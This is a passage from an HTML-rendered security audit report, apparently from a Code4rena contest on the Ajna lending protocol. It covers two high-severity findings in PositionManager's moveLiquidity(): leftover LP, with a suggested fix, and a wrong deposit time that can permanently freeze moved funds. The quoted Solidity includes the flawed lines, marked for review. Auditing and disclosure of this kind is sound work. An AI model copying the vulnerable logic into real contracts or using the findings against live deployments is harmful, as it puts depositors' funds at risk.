class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">moveQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxQuote</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update position LP state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;      </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">   += </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update position deposit time to the from bucket deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Bucket can contain a mix of quote and collateral tokens, but moveLiquidity() aims to retrieve <code>vars.maxQuote = _lpToQuoteToken(...)</code> quote funds per current exchange rate:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/helpers/PoolHelper.sol#L222-L236\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/helpers/PoolHelper.sol#L222-L236</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_lpToQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bucketLP_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bucketCollateral_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deposit_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lenderLPBalance_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxQuoteToken_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bucketPrice_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteTokenAmount_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Buckets</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getExchangeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bucketCollateral_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bucketLP_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">deposit_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bucketPrice_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">quoteTokenAmount_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lenderLPBalance_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quoteTokenAmount_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">deposit_</span><span class=\"mtk1\">)       </span><span class=\"mtk12\">quoteTokenAmount_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">deposit_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quoteTokenAmount_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">maxQuoteToken_</span><span class=\"mtk1\">) </span><span class=\"mtk12\">quoteTokenAmount_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maxQuoteToken_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>There might be not enough quote deposit funds available to redeem the whole quote amount requested, which is controlled by the corresponding liquidity constraint:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L711-L719\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L711-L719</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">scaledLpConstraint</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wmul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpConstraint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">exchangeRate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;          </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositConstraint</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">scaledDepositAvailable</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositConstraint</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">scaledLpConstraint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// depositConstraint is binding constraint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">removedAmount_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositConstraint</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;          </span><span class=\"mtk12\">redeemedLP_</span><span class=\"mtk1\">    = </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wdiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">removedAmount_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">exchangeRate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As a most straightforward solution consider reverting when there is a remainder, i.e. when <code>fromPosition.lps > dust_threshold</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function moveLiquidity(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        MoveLiquidityParams calldata params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        MoveLiquidityLocalVars memory vars;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        vars.depositTime = fromPosition.depositTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // handle the case where owner attempts to move liquidity after they&#39;ve already done so</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (vars.depositTime == 0) revert RemovePositionFailed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // ensure bucketDeposit accounts for accrued interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        IPool(params_.pool).updateInterest();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // retrieve info of bucket from which liquidity is moved  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.bucketLP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.bucketCollateral,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.bankruptcyTime,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.bucketDeposit,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = IPool(params_.pool).bucketInfo(params_.fromIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // check that bucket hasn&#39;t gone bankrupt since memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (vars.depositTime &lt;= vars.bankruptcyTime) revert BucketBankrupt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // calculate the max amount of quote tokens that can be moved, given the tracked LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        vars.maxQuote = _lpToQuoteToken(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.bucketLP,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.bucketCollateral,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.bucketDeposit,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            fromPosition.lps,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.bucketDeposit,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _priceAt(params_.fromIndex)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // remove bucket index from which liquidity is moved from tracked positions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // update bucket set at which a position has liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // slither-disable-next-line unused-return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        positionIndex.add(params_.toIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // move quote tokens in pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.lpbAmountFrom,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.lpbAmountTo,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = IPool(params_.pool).moveQuoteToken(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            vars.maxQuote,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            params_.fromIndex,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            params_.toIndex,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            params_.expiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        Position storage toPosition = positions[params_.tokenId][params_.toIndex];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // update position LP state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;      fromPosition.lps -= vars.lpbAmountFrom;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        toPosition.lps   += vars.lpbAmountTo;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // update position deposit time to the from bucket deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        toPosition.depositTime = vars.depositTime;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/503#issuecomment-1554797037\">ith-harvey (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-positionmanagers-moveliquidity-can-set-wrong-deposit-time-and-permanently-freeze-lp-funds-moved\" style=\"position:relative;\"><a href=\"#h-02-positionmanagers-moveliquidity-can-set-wrong-deposit-time-and-permanently-freeze-lp-funds-moved\" aria-label=\"h 02 positionmanagers moveliquidity can set wrong deposit time and permanently freeze lp funds moved permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/494\">[H-02] PositionManager’s <code>moveLiquidity</code> can set wrong deposit time and permanently freeze LP funds moved</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/494\">hyh</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/88\">nobody2018</a></em></p>\n<p><code>moveLiquidity()</code> set new destination index LP entry deposit time to be equal to the source index deposit time, while destination bucket might have defaulted after that time.</p>\n<p>This is generally not correct as source bucket bankruptcy is controlled (i.e. LP shares that are moved are healthy), while the destination bucket’s bankruptcy time, being arbitrary, can be higher than source index deposit time, and in this case the funds will become inaccessible after such a move (i.e. healthy shares will be marked as defaulted due to incorrect deposit time used).</p>\n<p>In other words the funds are moved from healthy non-default zone to an arbitrary point, which can be either healthy or not. In the latter case this constitutes a loss for an owner as <code>toIndex</code> bucket bankruptcy time exceeding deposit time means that all other retrieval operations will be blocked.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Owner will permanently lose access to the LP shares whenever <code>positions[params_.tokenId][params_.toIndex]</code> bucket bankruptcy time is greater than <code>positions[params_.tokenId][params_.fromIndex].depositTime</code>.</p>\n<p><code>moveLiquidity()</code> is a common operation, while source and destination bucket bankruptcy times can be related in an arbitrary manner, and the net impact is permanent fund freeze, so this is a fund loss without material prerequisites, setting the severity to be high.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>moveLiquidity()</code> sets <code>toPosition</code> deposit time to be <code>fromPosition.depositTime</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MoveLiquidityParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mayInteract</span><span class=\"mtk1\">(params_.pool, params_.tokenId) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MoveLiquidityLocalVars</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;      </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// handle the case where owner attempts to move liquidity after they&#39;ve already done so</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ensure bucketDeposit accounts for accrued interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// retrieve info of bucket from which liquidity is moved  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span 